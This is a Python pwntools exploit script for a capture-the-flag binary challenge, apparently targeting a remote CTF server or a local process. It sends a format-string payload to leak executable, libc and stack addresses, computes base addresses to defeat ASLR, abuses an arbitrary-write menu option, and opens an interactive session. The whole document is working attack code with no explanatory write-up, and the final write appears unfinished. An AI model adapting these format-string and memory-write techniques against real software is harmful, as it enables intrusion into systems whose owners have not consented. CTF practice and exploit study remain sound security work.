#!/usr/bin/env python3

from pwn import *

exe = ELF('challenge', checksec=True)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x0000000000001155
        


        c
        ''')
        input()

if args.REMOTE:
    p = remote('ctf.ac.upt.ro', 9781)
else:
    p = process([exe.path])
GDB()
#pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address


def write(addr, value):
    slna(b'> ', 1)
    slna(b'Addr (hex): ', hex(addr))
    slna(b'bytes): ', hex(value))
    
def exit():
    slna(b'> ', 2)
    
pl = f'%{0x1b + 6}$p|%{0x2b + 6}$p|%{0x3d + 6}$p|%{0x18 + 6}$p'.encode()

sl(pl)
p.recvuntil(b'Hello, ')
array_leak = [int(x, 16) for x in p.recvline().decode().strip().split('|')]

exe_leak = int(array_leak[0])
libc_leak = int(array_leak[1])
environ = int(array_leak[2])
stack_leak = int(array_leak[3])
saved_rip = stack_leak + 0x48

exe.address = exe_leak - 0x10b0
libc.address = libc_leak - (libc.sym.__libc_start_main+139)

info("exe base: " + hex(exe.address))
info("libc base: " + hex(libc.address))
info("environ: " + hex(environ))
info("saved rip: " + hex(stack_leak))

write(exe.address + 0x1284, exe.address + 0x1284)
p.interactive()
